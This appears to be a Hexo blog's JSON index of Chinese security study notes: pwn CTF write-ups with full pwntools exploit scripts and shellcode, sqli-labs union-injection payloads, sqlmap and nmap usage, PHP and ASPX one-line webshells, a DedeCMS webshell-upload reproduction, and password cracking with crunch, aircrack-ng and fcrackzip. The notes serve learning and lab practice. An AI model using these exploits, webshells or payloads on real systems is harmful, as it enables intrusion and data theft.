info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"二进制之ctf基础pwn题","slug":"二进制之ctf基础pwn题","date":"2019-07-27T07:49:20.000Z","updated":"2019-08-05T08:24:33.858Z","comments":true,"path":"2019/07/27/二进制之ctf基础pwn题/","link":"","permalink":"http://yoursite.com/2019/07/27/二进制之ctf基础pwn题/","excerpt":"##做题大体思路首先可以看看是否有后门函数，有的话，直接通过后门函数拿到shell，若没有，可以选择构造后门函数；若后门函数行不通，可以考虑执行shellcode，但前提是程序没有打开NX保护；若程序开启了canare保护，就不能简单的覆盖栈，必须保证canary不变，可以考虑通过字符串格式化漏洞，找到这个canary的位置，然后再进行操作。","text":"##做题大体思路首先可以看看是否有后门函数，有的话，直接通过后门函数拿到shell，若没有，可以选择构造后门函数；若后门函数行不通，可以考虑执行shellcode，但前提是程序没有打开NX保护；若程序开启了canare保护，就不能简单的覆盖栈，必须保证canary不变，可以考虑通过字符串格式化漏洞，找到这个canary的位置，然后再进行操作。 ##level0 先用checksec查看一下保护机制，发现几乎没什么保护机制，并且是一个64位的程序用ida64打开这个题有一个后门函数callsystm，直接返回一个system(“/bin/sh”)也就是一个命令框，这就是我们想要的，所以不用再构造后门函数脚本如下： from pwn import* //导入pwntools工具包 p=remote(‘pwn2.jarvisoj.com’,9881) //建立一个远程连接 callsystem=0x0000000000400596 //后门函数的地址 payload=’a’(0x80+0x8)+p64(callsystem) //用’a’0x80填满buf及以下的空间，一直到ebp，然后用’a’*0x8填满ebp，ebp下面的函数地址就被填入后门函数的返回地址，这里要注意的是32位程序ebp的大小位0x4,64位的是0x8 p.sendlineafter(‘World\\n’,payload) //发送数据 p.interactive() //将控制权交给用户 ##level1 仍旧是用checksec查看，32位，几乎没开保护机制，关键是NX没开，意味着栈上的数据可执行，用ida打开，找到溢出点；这次没有后门函数，但是这个函数却调用了printf函数，输出了buf的地址，再结合着NX保护是关闭的，直接将shellcode写到buf中函数返回时直接跳转到buf位置，就可以执行shellcode，拿到控制权，脚本如下： from pwn import* p=remote(&quot;pwn2.jarvisoj.com&quot;,9877) sh=p.recvline()[14:-2]recvline()是接受一行数据,[14:-2]只是python里的一个切片,是”What’sthis:0xffee6c50?”里边的第14个到倒数第二个字符 stack_addr=int(sh,16)这里的text为buf的地址，只不过是字符型的，需要int（text，16）用16进制的方法转化为int型 payload=asm(shellcraft.sh()).ljust(0x88)+&quot;A&quot;*4+p32(stack_addr)asm(shellcraft.sh())是生成shellcode的，ljust（0x88）是把生成的修剪为长度为0x88的 p.sendline(payload) p.interactive()##level2 首先用checksec查看，这次NX打开了，不能执行shellcode了，用ida打开发现有_system函数，并且有/bin/sh/，可以构造后门函数，将函数返回地址用system的地址覆盖，将传入参数设置成”/bin/sh”, from pwn import* p=remote(&apos;pwn2.jarvisoj.com&apos;,9878) system_addr=0x08048320 sh_addr=0x0804A024 payload = &apos;a&apos; * (0x88 + 0x4) + p32(system_addr) + p32(0) + p32(sh_addr) p.sendline(payload) p.interactive()‘a’ * (0x88 + 0x4)覆盖buf和rbpp32(system_addr) 传system的地址到函数返回地址p32(0) 覆盖栈底p32(sh_addr) 传”/bin/sh”到system函数 ##level2_x64 和32位的思路相同，不同的是，传参的方式不同32位的是直接把参数放入栈里，而64位的是把参数放进寄存器里 from pwn import* p=remote(&apos;pwn2.jarvisoj.com&apos;,9882) system_addr=0x00000000004004C0 pop_addr=0x00000000004006b3 sh_addr=0x0000000000600A90 payload = &apos;a&apos; * (0x80 + 0x8)+ p64(pop_addr) + p64(sh_addr)+ p64(system_addr) p.send(payload) p.interactive()pop_addr 第一个参数存入的寄存器的地址，rdi的地址p64(pop_addr) + p64(sh_addr)+ p64(system_addr) 先把”/bin/sh”的地址放入寄存器，然后再传入system函数 可用 ROPgadget –binary level2_x64 –only “pop|ret” 指令找到rdi地址 ##level3先知道plt表和got表的一些相关知识。反编译的过程当中，我们经常会发现xxx@plt的函数，因为为了用户体验和cpu的利用率，编译的时候需要两个表来进行辅助，一个是got表另外一个是plt表。plt表是内部函数表，got表是全局函数表，两者是一一对应的关系，网上找到过一张图，描述的很形象。也就是说plt表里面放的是got表的地址，got表里面放的是函数的真实地址。（链接：https://www.jianshu.com/p/722bcf89c6c2） 这道题，在给出程序的同时，给出了一个libc库；先进行一下安全检查，NX保护打开，但是在程序中却没有发现后门函数，因此，要根据libc库构建一个；通过找libc库中未偏移的write函数地址，和程序中偏移后的write函数地址，得出偏移量，然后从libc库里找system函数和”/bin/sh/“的地址，加上偏移量，得到真正的地址，这样，后门函数构造完成from pwn import*p=remote(“pwn2.jarvisoj.com”,”9879”)elf=ELF(“level3”)plt_write=elf.plt[“write”]main_addr=0x08048484p.recvline()payload = “A” * 0x88 + “A” * 4 + p32(plt_write) + p32(main_addr) + p32(1) + p32(elf.got[“write”]) + p32(4)p.send(payload)write_addr=u32(p.recv(4))print “write_addr=”+hex(write_addr) libc=ELF(“libc-2.19.so”)bss_addr=0x0804a024libc_system=libc.symbols[“system”]libc_binsh=next(libc.search(“/bin/sh”))libc_write=libc.symbols[“write”] system_addr=write_addr-libc_write+libc_systembinsh_addr=write_addr-libc_write+libc_binshprint “system_addr=”+hex(system_addr) p.recvline() payload = “A” * 0x88 + “A” * 4 + p32(system_addr) + p32(0) + p32(binsh_addr)p.sendline(payload)p.interactive() ##level3_x64思路和level3相同，不同的仍然是64位和32位的传参区别from pwn import*p=remote(“pwn2.jarvisoj.com”,”9883”)elf=ELF(“level3”)plt_write=0x00000000004004B0main_addr=0x000000000040061Apop_rdi=0x00000000004006b3pop_rsi=0x00000000004006b1p.recvline()payload = “A” * 0x80 + “A” * 8 + p64(pop_rdi)+p64(1) +p64(pop_rsi)+ p64(0x0000000000600A58)+p64(0)+p64(plt_write) + p64(main_addr)p.send(payload)write_addr=u64(p.recv(8))print “write_addr=”+hex(write_addr)print hex(elf.got[“write”])libc_system=0x0000000000046590libc_binsh=0x0000000000180543libc_write=0x00000000000EF3B0 system_addr=write_addr-libc_write+libc_systembinsh_addr=write_addr-libc_write+libc_binshprint “system_addr=”+hex(system_addr) p.recvline() payload = “A” * 0x80 + “A” * 8 +p64(pop_rdi)+ p64(binsh_addr)+ p64(system_addr) + p64(0)p.sendline(payload)p.interactive() ##pwn1格式化字符串漏洞的远离：格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。 这道题用到的漏洞，字符串格式化漏洞；这里开启了canary保护，没有开启NX，可以执行shellcode这题的思路：首先通过字符串格式化漏洞，泄露出canary在栈中的地址，以便覆盖栈时保证相应的地址canary不变，然后在函数返回地址中填入shellcode的地址，然后把shellcode放入相应的地址from pwn import * shellcode=”\\x31\\xc0\\x31\\xd2\\x31\\xdb\\x31\\xc9\\x31\\xc0\\x31\\xd2\\x52\\x68\\x2f\\x2f” “\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\x31\\xc0\\xb0” “\\x0b\\xcd\\x80\\n”context.log_level=’debug’p=process(“./pwn1”)//p=remote(‘172.16.80.240’,8000)p.recvuntil(‘name:’)p.sendline(‘%p.’40)leak_data=p.recvuntil(‘messages:’)address=leak_data.split(‘.’)for i in range(len(address)): print str(i)+’:’+str(address[i])canary=address[30]print “canary=”+canaryprev_ebp_addr=address[33]print “stack_addr=”+prev_ebp_addrshellcode_addr=int(prev_ebp_addr,16)-144+0x8payload=’a’100+p32(int(canary,16))+’A’*12+p32(shellcode_addr)+shellcodep.sendline(payload)p.interactive()","categories":[],"tags":[]},{"title":"ubuntu16下 pwntools的安装","slug":"pwntools的安装","date":"2019-07-23T03:22:12.000Z","updated":"2019-07-23T03:26:54.963Z","comments":true,"path":"2019/07/23/pwntools的安装/","link":"","permalink":"http://yoursite.com/2019/07/23/pwntools的安装/","excerpt":"","text":"sudo apt-get update sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essentia sudo pip install --upgrade pip -i http://pypi.douban.com/simple --trusted-host pypi.douban.com sudo pip install --upgrade pwntools -i http://pypi.douban.com/simple --trusted-host pypi.douban.com如果第四条指令报错的话，可以在最后加上 –user 试试；","categories":[],"tags":[]},{"title":"sql注入","slug":"sql注入","date":"2019-07-20T08:24:08.000Z","updated":"2019-08-07T11:36:34.361Z","comments":true,"path":"2019/07/20/sql注入/","link":"","permalink":"http://yoursite.com/2019/07/20/sql注入/","excerpt":"","text":"常用的系统函数1.version() –mysql版本2.user() –数据库用户名3.database() – 数据库名4.@@datadir –数据库路径5.@@version_compile_os –操作系统版本字符串连接符号 group_concat(Str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每一条数据 ##sqli-labs-master## ###Less1###爆所有的数据库名 127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata%23 库名：information_schema,�����ݿ�,challenges,dedecmsv57utf8sp2,dvwa,mysql,performance_schema,security,test,wordpress 爆表名 127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’ –+表名：emails,referers,uagents,users 爆列名：127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+ 爆数据 127.0.0.1/sqli-labs-master/Less-1/?id=-1’ union select 1,username,password from users where id=2–+ ###Less2","categories":[],"tags":[]},{"title":"WEB前端安全-XSS与CSRF","slug":"drops夏令营14","date":"2019-07-20T07:11:35.000Z","updated":"2019-07-20T07:24:20.490Z","comments":true,"path":"2019/07/20/drops夏令营14/","link":"","permalink":"http://yoursite.com/2019/07/20/drops夏令营14/","excerpt":"","text":"XSS XSS，Cross Site Script，即跨站脚本攻击；XSS攻击通常指黑客通过“HTML”注入篡改了网页，插入了恶意的脚本，从而在浏览网页时，控制用户浏览器的一种攻击。XSS根据效果的不同可以分为以下三类： 反射型XSS，也叫做“非持久型XSS”，只是简单的把用户输入的数据“反射”给浏览器； 存储型XSS，也叫做“持久型XSS”，会把用户输入的数据“存储在”服务器端。常见的场景是，黑客写下一篇含有恶意JavaScript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码； DOM Based XSS，从效果来说也是反射型XSS，单独划分出了是因为DOM Based XSS的形成原因比较特殊，通过修改页面的DOM节点形成的XSS XSS常见危害：劫持用户会话盗取cookie钓鱼欺骗强制弹出广告提升用户权限传播跨站脚本蠕虫 CSRFCSRF，Cross Site Request Forgery，即跨站点请求伪造；它是一种常见的Web攻击，也是Web安全中最容易被忽略的一种攻击方式它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户的请求来利用受信任的网站。 一般攻击方式为攻击者诱使用户访问了一个页面，就以该用户身份在第三方站点里执行了一次操作 CSRF攻击的两个重点 *CSRF的攻击建立在浏览器与web服务器的会话中*欺骗用户访问URL","categories":[],"tags":[]},{"title":"渗透测试工具","slug":"drops夏令营11","date":"2019-07-20T06:49:20.000Z","updated":"2019-07-20T08:00:59.768Z","comments":true,"path":"2019/07/20/drops夏令营11/","link":"","permalink":"http://yoursite.com/2019/07/20/drops夏令营11/","excerpt":"","text":"nmap(一款开源免费的网络发现（Network Discovery）和安全审计（Security Auditing）工具)SQLMAP(sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测，利用SQL注入漏洞，获取数据库服务器的权限)burpsuite(BurpSuite 是用于攻击web 应用程序的集成平台，包含了许多工具)hydra(Hydra是一款非常强大的暴力破解工具，它是由著名的黑客组织THC开发的一款开源暴力破解工具)中国菜刀 中国蚁剑（网站管理工具）御剑（一款好用的网站后台扫描工具）nessus（一款漏洞扫描程序）AWVS(一个自动化的web应用程序安全测试工具) nmap的基本功能主机发现、端口扫描、版本侦测、操作系统侦测 常用参数-A ：选项用于使用进攻性方式扫描-T4： 指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况较好的情况下推荐使用T4-oX test.xml： 将扫描结果生成 test.xml 文件-oG test.txt: 将扫描结果生成 test.txt 文件-sn : 只进行主机发现，不进行端口扫描-O : 指定Nmap进行系统版本扫描-sV: 指定让Nmap进行服务版本扫描-p : 扫描指定的端口-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描-sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况-Pn ： 不进行ping扫描-sP : 用ping扫描判断主机是否存活，只有主机存活，nmap才会继续扫描，一般最好不加，因为有的主机会禁止ping-PI : 设置这个选项，让nmap使用真正的ping(ICMP echo请求)来扫描目标主机是否正在运行。-iL 1.txt : 批量扫描1.txt中的目标地址-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现-sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况-sO: 使用IP protocol 扫描确定目标机支持的协议类型-PO : 使用IP协议包探测对方主机是否开启-PE/PP/PM : 使用ICMP echo、 ICMP timestamp、ICMP netmask 请求包发现主机-e eth0：指定使用eth0网卡进行探测-f : –mtu : 指定使用分片、指定数据包的 MTU.-b : 使用FTP bounce scan扫描方式-g： 指定发送的端口号-n : 表示不进行DNS解析；-S : 伪装成其他 IP 地址 扫描特定主机上的某些端口1.nmap -p 21,22,23,80,443 192.168.1.1 //扫描指定端口2.nmap -p 20-80 192.168.1.1 //扫描指定范围内的端口 sqlmap参数-p 指定测试参数-b 获取banner–dbs 列举数据库–is-dba 是否是管理员权限–current-db 当前数据库–current-user 当前用户–tables 列举数据库的表名–count 检索所有条目数–columns 获取表的列名–dump 获取表中的数据，包含列–dump-all 转存DBMS数据库所有表项目–level 测试等级(1-5)，默认为1-v 显示详细信息操作步骤读数据库-&gt;读取表-&gt;读取表的列-&gt; 获取内容-D 指定数据库 -T 指定表 -C指定列–dbms==mysql Oracle mysql 指定数据库 举例爆数据库 sqlmap –u “http://127.0.0.1/sqli-labs/Less-1/?id=1” –dbs当前数据库 sqlmap –u “http://127.0.0.1/sqli-labs/Less-1/?id=1” –current-db列举数据库的表名 sqlmap –u http://127.0.0.1/sqli-labs/Less-1/?id=1 –D security – tables列出表中的字段 sqlmap –u http://127.0.0.1/sqli-labs/Less-1/?id=1 –D security –T users –columns列出字段内容 sqlmap –u http://127.0.0.1/sqli-labs/Less-1?id=1 –D security –T users –C password –dump Burpsuite Proxy代理模块 Burpsuite默认使用8080端口作为代理，当然，你也可以自己修改端口号。Proxy——&gt;Options，然后下面可以自己修改代理的端口号，默认是8080这里 Proxy 的 Intercept 这里显示 Intercept is on 表示拦截包开启，所有代理的包都必须先经过burpsuite放行才可以走。如果这里我们选择 intercept is off 的话，那么所有的包都会经过burpsuite，可以在HTTP history看所有经过的包，但是burpsuite不会对经过的包进行拦截。 Repeater模块(改包，重放) 抓取包之后，右键 Send to Repeater 发送到重发模块在 Repeater模块，我们可以随意修改数据包。修改完后，点击 go ，就可以发包了。右边就会显示 服务器回的包。 中国蚁剑 中国菜刀 与一句话木马有关一句话木马就是只需要一行代码的木马，短短一行代码，就能做到和大马相当的功能。为了绕过waf的检测，一句话木马出现了无数中变形，但本质是不变的：木马的函数执行了我们发送的命令。 简单的一句话木马：PHP： Asp： &lt;%eval request (“pass”)%&gt;Aspx： &lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;","categories":[],"tags":[]},{"title":"漏洞复现","slug":"drops夏令营15","date":"2019-07-20T06:25:41.000Z","updated":"2019-07-20T06:37:28.150Z","comments":true,"path":"2019/07/20/drops夏令营15/","link":"","permalink":"http://yoursite.com/2019/07/20/drops夏令营15/","excerpt":"","text":"一、 dedeCMS漏洞的文件路径 DedeCMS-V5.7-UTF8-SP2\\uploads\\dede\\tpl.php漏洞的代码如下： else if($action==’savetagfile’){ csrf_check(); if(!preg_match(“#^[a-z0-9_-]{1,}.lib.php$#i”, $filename)) { ShowMsg(‘文件名不合法，不允许进行操作！’, ‘-1’); exit(); } require_once(DEDEINC.’/oxwindow.class.php’); $tagname = preg_replace(“#.lib.php$#i”, “”, $filename); $content = stripslashes($content); $truefile = DEDEINC.’/taglib/‘.$filename; $fp = fopen($truefile, ‘w’); fwrite($fp, $content);fclose($fp); 通过分析发现，因为没有对写入的内容做过滤，我们可以写一句话木马上传了 if(!preg_match(“#^[a-z0-9_-]{1,}.lib.php$#i”, $filename))Preg_match()函数是正则匹配的函数，里面写上匹配的规则，匹配所有包含一个以上的字母数字下划线和横杠，后面的.意思是匹配小数点，i表示大小写不敏感Preg_replaceStripslashes()该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。 UR输入 域名+/ DedeCMS-V5.7-UTF8-SP2/uploads/dede/tpl.php?action=upload获取 token然后输入action=savetagfile&amp;token=b87a7b8629b120fb009c8992cce7c68f&amp;filename=123.lib.php&amp;content= 上传一个123.lib.php文件，里边写着一句话木马 然后用蚁剑连上；","categories":[],"tags":[]},{"title":"ctf之MISC","slug":"drops夏令营13","date":"2019-07-19T07:31:31.000Z","updated":"2019-07-20T06:41:32.060Z","comments":true,"path":"2019/07/19/drops夏令营13/","link":"","permalink":"http://yoursite.com/2019/07/19/drops夏令营13/","excerpt":"","text":"流量分析文件格式分析隐写 图片 音频压缩包分析古典密码 流量分析（wireshark使用）………… ……常见文件头和文件尾的16进制编码：JPEG (jpg) 文件头：FFD8FF 文件尾：FF D9 PNG (png) 文件头：89504E47 文件尾：AE 42 60 82 GIF (gif) 文件头：47494638 文件尾：00 3B ZIP Archive (zip) 文件头：504B0304 文件尾：50 4B TIFF (tif)， 文件头：49492A00 RAR Archive (rar)， 文件头：52617221 Windows Bitmap (bmp)， 文件头：424DAdobe Photoshop (psd)， 文件头：38425053Rich Text Format (rtf)， 文件头：7B5C727466 XML (xml)， 文件头：3C3F786D6C HTML (html)， 文件头：68746D6C3EOutlook Express (dbx)， 文件头：CFAD12FEC5FD746FOutlook (pst)， 文件头：2142444EMS Word/Excel (xls.or.doc)， 文件头：D0CF11E0MS Access (mdb)， 文件头：5374616E64617264204AWordPerfect (wpd)， 文件头：FF575043Adobe Acrobat (pdf)， 文件头：255044462D312EQuicken (qdf)， 文件头：AC9EBD8F…… 文件分离的方法 除了用foremost外，还有binwalk、dd命令binwalk -e 文件名dd前面介绍的是自动化分离工具，dd这个工具是一种半自动化工具，有的时候自动化工具不能实现文件的分离，所以需要用这个工具来进行分离。使用dd命令分离文件格式如下：dd if=源文件名 of=输出文件名 skip=开始分离的字节数 bs=1；参数说明：if=file #输入文件名，缺省为标准输入。of=file #输出文件名，缺省为标准输出。bs=bytes #同时设置读写块的大小为 bytes ，可代替 ibs 和 obs 。skip=blocks #从输入文件开头跳过 blocks 个块后再开始复制。 Lsb隐写 和音频隐写（Audacity、MP3stego 使用）……。。。。。。 Zip伪加密问题 识别真假加密无加密压缩源文件数据区的全局加密应当为00 00且压缩源文件目录区的全局方式位标记应当为00 00假加密压缩源文件数据区的全局加密应当为00 00且压缩源文件目录区的全局方式位标记应当为09 00真加密压缩源文件数据区的全局加密应当为09 00且压缩源文件目录区的全局方式位标记应当为09 00第二个数字为奇数时 –&gt;加密第二个数字为偶数时 –&gt;未加密 对于伪加密有以下几种方法： 在Mac OS及部分Linux（如Kali）系统中，可以直接打开伪加密的zip压缩包 使用检测伪加密的ZipCenOp.jar，解密后如果能成功打开zip包，则是伪加密，否则说明思路错误。使用ZipCenOp.jar(需要java环境)，在cmd中使用java -jar ZipCenOp.jar -r xxx.zip 压缩包明文攻击 明文攻击是一种较为高效的攻击手段，大致原理是当你不知道一个zip的密码，但是你有zip中的一个已知文件（文件大小要大于12Byte）时，因为同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件 ……。。。。。。 古典密码 凯撒密码栅栏密码棋盘密码希尔密码摩斯电码猪圈密码键盘密码当铺密码（http://www.zjslove.com/3.decode/dangpu/index.html）","categories":[],"tags":[]},{"title":"ctf之web安全","slug":"drops夏令营12","date":"2019-07-19T07:25:12.000Z","updated":"2019-07-20T06:40:42.946Z","comments":true,"path":"2019/07/19/drops夏令营12/","link":"","permalink":"http://yoursite.com/2019/07/19/drops夏令营12/","excerpt":"","text":"Web题目分类1.源码获取，扫描，弱密码爆破，js绕过 Php代码审计，弱类型比较 文件上传，文件包含 序列化和反序列化 Sql注入（必有） Xss跨站脚本攻击（难） 第一节web基础知识 X-Forwarded-For 是一个 HTTP 扩展头部，主要是为了让 Web 服务器获取访问用户的真实 IP 地址（其实这个真实未必是真实的，是自己写入的，完全由自己定夺，是自己想告诉服务器自己的IP地址）； Referer是告诉服务器你从哪里来，比如说从谷歌来； 源码获取，git 由于现在当前大量开发人员使用git进行版本控制，对站点自动部署。 如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。GitHack是一个.git泄露利用脚本，通过泄露的.git文件夹下的文件，还原重建工程源代码。 扫描 有些网站的隐藏的文件，页面并不是能够发现，所以需要我们利用一些扫描工具进行扫描，得到隐藏的页面，得到关键的信息。常用的扫描软件：御剑，dirserach御剑在window下运用，而dirsearch需要在linux下进行扫描。Dirsearch扫描命令格式：./dirsearch –u 目标网址 –e*例如：./dirsearch –u htttps://www.baidu.com –e* 第二节 php代码审计 Extract变量覆盖Php弱类型比较二次url编码绕过哈希绕过正则绕过 第三节 文件上传 文件包含 本地js检验黑名单检验白名单内容检验竞争上传 本地包含远程文件 包含相关函数：Include（）Include_once（）require()Rquire_once() 第四节 序列化和反序列化 在PHP中，序列化用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。序列化函数原型如下：string serialize ( mixed $value )对象的序列化主要有两种用途：1） 把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；2） 在网络上传送对象的字节序列。在很多应用中，需要对某些对象进行序列化，让它们离开内存空间，入住物理硬盘，以便长期保存。比如最常见的是Web服务器中的Session对象，当有 10万用户并发访问，就有可能出现10万个Session对象，内存可能吃不消，于是Web容器就会把一些seesion先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中。当两个进程在进行远程通信时，彼此可以发送各种类型的数据。无论是何种类型的数据，都会以二进制序列的形式在网络上传送。发送方需要把这个Java对象转换为字节序列，才能在网络上传送；接收方则需要把字节序列再恢复为Java对象。https://www.cnblogs.com/youyoui/p/8610068.html 魔术方法参考网站：https://php.net/manual/zh/language.oop5.magic.phpconstruct(), __destruct(), __call(), __callStatic(), __get(), __set(), __isset(), __unset(),__sleep(), __wakeup(), __toString(), __invoke(), __set_state(), __clone()和debuginfo()等方法在 PHP 中被称为魔术方法（Magic methods）。在命名自己的类方法时不能使用这些方法名，除非是想使用其魔术功能。 CautionPHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。所以在定义类方法时，除了上述魔术方法，建议不要以 __ 为前缀。 serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。 第五节 sql注入 宽字节注入约束条件注入基于时间盲注","categories":[],"tags":[]},{"title":"test","slug":"test","date":"2019-06-14T16:41:45.000Z","updated":"2019-08-06T10:01:25.814Z","comments":true,"path":"2019/06/15/test/","link":"","permalink":"http://yoursite.com/2019/06/15/test/","excerpt":"","text":"哈哈","categories":[],"tags":[]},{"title":"ctf杂项中 想蹭网先解开密码、隐写2两道writeup","slug":"杂项两道writeup","date":"2019-06-14T09:16:27.000Z","updated":"2019-08-06T11:15:08.844Z","comments":true,"path":"2019/06/14/杂项两道writeup/","link":"","permalink":"http://yoursite.com/2019/06/14/杂项两道writeup/","excerpt":"","text":"##想蹭网先解开密码根据提示，我们只要猜出正确的手机号就能拿到flag并且我们已经知道手机号前七位，只需要猜到后四位使用kali Linux中的工具 crunch 生成密码字典制作1391040开头的11位手机号密码字典 crunch 11 11 0123456789 -t 1391040%%%% -o num11.txt两个11 分别是密码的最小长度和最大长度 num11.txt 是生成的字典名称 利用aircrack-ng破解密码aircrack-ng -w num11.txt wifi.cap 这里num11.txt是爆破用到的密码字典 ##隐写首先用kali中的binwalk分析这个图片，发现有一个rar文件 11 然后用foremost分离，得到一个output文件夹 接着打开路径 output/zip解压里边的zip压缩包，得到如图两个文件 然后再次解压里边的flag.rar，却发现需要密码然后回头看一下另一个，是个图片根据提示的图片，知道密码是三个数字三位的数字密码，继续用crunch生成字典 crunch 3 3 0123456789 -o 3number.txt 之后用kali 自带的fcrackzip工具解密，得到解密密码871。fcrack -D -p 3number.txt -u flag.rar -v-D 就是用的字典模式 -p指定起始破解密码 -u这个参数是为了显示密码用 -v是展示更多信息 输入密码，发现压缩包里还是一张图片 用HXD打开这张图片，在最下边找到信息f1@g{eTB1IEFyZSBhIGhAY2tlciE=} 发现中括号里边的是用base64加密的，然后用ascll及进制转换这个工具，得到y0u Are a h@cker!最后得到flag，f1@g{ y0u Are a h@cker!}","categories":[],"tags":[]},{"title":"最近常用命令行命令","slug":"我的第一篇博客文章","date":"2019-06-08T13:24:29.000Z","updated":"2019-07-19T07:39:49.162Z","comments":true,"path":"2019/06/08/我的第一篇博客文章/","link":"","permalink":"http://yoursite.com/2019/06/08/我的第一篇博客文章/","excerpt":"","text":"##Windows下的命令cd..或者cd .. 返回文件上一层目录cd/ 退回根目录cd ../.. 返回文件上两回目录cd d: 切换到D盘cd / 跳转到根目录cd path 跳转到指定目录cls 清除当前屏幕显示dir 显示当前目录中的子文件夹与文件exit 退出dos命令行 md 创建目录例：md movie 在当前目录中创建名为movie的文件夹例：md d:\\test\\movie 创建d:\\test\\movie目录 rd 删除目录例：rd movie // 删除当前目录下的movie空文件夹例：rd /s /q d:\\test // 使用安静模式删除d:\\test（除目录本身外，还将删除指定目录下的所有子目录和文件） move 移动目录 move 1.png d:\\test\\2.png // 将当前目录下的1.png移动到d盘test文件夹中，并重命名为2.png （若test中也存在同名的png图片，会询问是否覆盖） ##Linux下的命令 tar zxvf 文件名 解压tar.gz 类型文件 unrar e all.rar 解压一个名为all的rar型文件rar a a.png a.rar 将一个名为a的图片压缩为一个名为a的rar文件pwd 查看当前所处目录路径mkdir 文件名 创建一个文件ls 显示当前目录中的子文件夹与文件","categories":[],"tags":[]}]}